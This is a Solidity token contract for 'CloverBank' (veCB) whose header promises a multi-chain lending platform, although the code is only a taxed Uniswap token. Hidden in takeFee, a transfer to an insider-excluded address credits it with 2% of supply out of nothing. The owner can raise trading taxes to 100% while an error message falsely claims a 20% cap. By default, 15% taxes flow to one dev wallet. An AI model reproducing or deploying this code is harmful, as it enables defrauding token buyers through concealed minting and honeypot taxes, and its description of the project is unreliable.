// SPDX-License-Identifier: MIT

/*
Clover Bank, centered around capital efficiency, operates as a decentralized lending platform that enables both protocols and individuals to lend and borrow cryptocurrencies across Ethereum, Optimism, Avalanche, and Fantom networks.

Website: https://cbfinance.org
Twitter: https://twitter.com/CloverBankFI
Telegram: https://t.me/CloverBankFI
Docs: https://medium.com/@clover.bnk/welcome-to-cloverbank-4a1f43e72ff6
*/

pragma solidity 0.8.21;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pairAddress);
}
interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
contract CloverBank is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"CloverBank";
    string private constant _symbol = unicode"veCB";
    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => bool) public isExcludedFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapRouterV2 routerV2;
    address public pairAddress;
    bool private tradeActive = false;
    bool private taxSwapActive = true;
    uint256 private numTaxSwaps;
    bool private swapping;
    uint256 numSwapped;
    uint256 private taxSwapThreshold = ( _supply * 1000 ) / 100000;
    uint256 private minTaxSwap = ( _supply * 10 ) / 100000;
    modifier lockingSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private devFee = 100;
    uint256 private burnFee = 0;
    uint256 private buyTax = 1500;
    uint256 private sellFee = 1500;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devAddress = 0xa87f69ed831B6eD13Cd781fb39320CbeF0F8139A; 
    address internal marketerAddress = 0xa87f69ed831B6eD13Cd781fb39320CbeF0F8139A;
    address internal lpReceiver = 0xa87f69ed831B6eD13Cd781fb39320CbeF0F8139A;
    uint256 public _maxTxAmount = ( _supply * 200 ) / 10000;
    uint256 public _maxSellAmount = ( _supply * 200 ) / 10000;
    uint256 public _maxWalletToken = ( _supply * 200 ) / 10000;

    constructor() Ownable(msg.sender) {
        IUniswapRouterV2 _router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        routerV2 = _router; pairAddress = _pair;
        isExcludedFee[lpReceiver] = true;
        isExcludedFee[marketerAddress] = true;
        isExcludedFee[devAddress] = true;
        isExcludedFee[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradeActive = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; devFee = _development; buyTax = _total; sellFee = _sell; transferFee = _trans;
        require(buyTax <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyTax and sellFee cannot be more than 20%");
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function swapTaxAndSendFee(uint256 tokens) private lockingSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(devFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketerAddress).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddress).transfer(contractBalance);}
    }
    
    function shouldTakeTax(address sender, address recipient) internal view returns (bool) {
        return !isExcludedFee[sender] && !isExcludedFee[recipient];
    }

    function getTotalTax(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pairAddress){return sellFee;}
        if(sender == pairAddress){return buyTax;}
        return transferFee;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function manualTaxSwap() external onlyOwner {
        swapTaxAndSendFee(taxSwapThreshold);
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFee[recipient]) {return _maxTxAmount;}
        if(getTotalTax(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalTax(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTotalTax(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();
        _approve(address(this), address(routerV2), tokenAmount);
        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFee[sender] && !isExcludedFee[recipient]){require(tradeActive, "tradeActive");}
        if(!isExcludedFee[sender] && !isExcludedFee[recipient] && recipient != address(pairAddress) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pairAddress){require(amount <= _maxSellAmount || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pairAddress && !isExcludedFee[sender]){numTaxSwaps += uint256(1);}
        if(feeSwappable(sender, recipient, amount)){swapTaxAndSendFee(taxSwapThreshold); numTaxSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFee[sender] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function feeSwappable(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTaxSwap;
        bool aboveThreshold = balanceOf(address(this)) >= taxSwapThreshold;
        return !swapping && taxSwapActive && tradeActive && aboveMin && !isExcludedFee[sender] && recipient == pairAddress && numTaxSwaps >= numSwapped && aboveThreshold;
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        numSwapped = _swapAmount; taxSwapThreshold = _supply.mul(_swapThreshold).div(uint256(100000)); 
        minTaxSwap = _supply.mul(_minTokenAmount).div(uint256(100000));
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(routerV2), tokenAmount);
        routerV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceiver,
            block.timestamp);
    }
}